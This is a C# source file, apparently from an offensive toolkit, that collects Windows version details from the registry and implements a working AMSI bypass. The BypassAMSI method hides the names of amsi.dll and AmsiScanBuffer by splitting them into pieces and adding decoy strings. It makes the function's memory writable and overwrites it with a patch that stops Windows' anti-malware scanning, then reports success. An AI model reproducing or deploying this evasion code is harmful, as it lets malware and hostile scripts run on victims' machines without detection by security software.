using System.Runtime.InteropServices;
using Microsoft.Win32;
using System;

namespace Core.ProcessHandler
{
    public class Hook
    {
        [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32", EntryPoint = "RtlMoveMemory", SetLastError = false)] static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static string GetWinVer()
        {
            string InstallPath = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", null);
            if (InstallPath != null)
            {
                return InstallPath;
            } else
            {
                return "";
            }            
        }

        public static string GetCurrentVer()
        {
            string InstallPath = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentVersion", null);
            if (InstallPath != null)
            {
                return InstallPath;
            }
            else
            {
                return "";
            }
        }

        public static string GetProductName()
        {
            string InstallPath = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", null);
            if (InstallPath != null)
            {
                return InstallPath;
            }
            else
            {
                return "";
            }
        }

        public static string BypassAMSI(){
            var bypass = new byte[] { 0x90, 0xB8, 0x00, 0x00, 0x00, 0x01, 0xc3};
            var two = "i.dll";
            var x = "zip";
            var one = "ams";
            var ll = LoadLibrary(one + two);
            var four = "iScanB";
            var y = "unzip";
            var three = "Ams";
            var five = "uffer";
            var pp = x + y;
            var ptr = GetProcAddress(ll, three + four + five);
            uint oldPerms;
            if(VirtualProtect(ptr, (UIntPtr) bypass.Length, 0x40, out oldPerms)){
                Marshal.Copy(bypass, 0, ptr, bypass.Length);
                VirtualProtect(ptr, (UIntPtr) bypass.Length, oldPerms, out oldPerms);
            }
            return "\n[>] Memory location of AmsiScanBuffer: " + ptr.ToString("X8")+"\n[+] " + "AmsiScanBuffer Patched With Bypass\n";
        }
    }
}
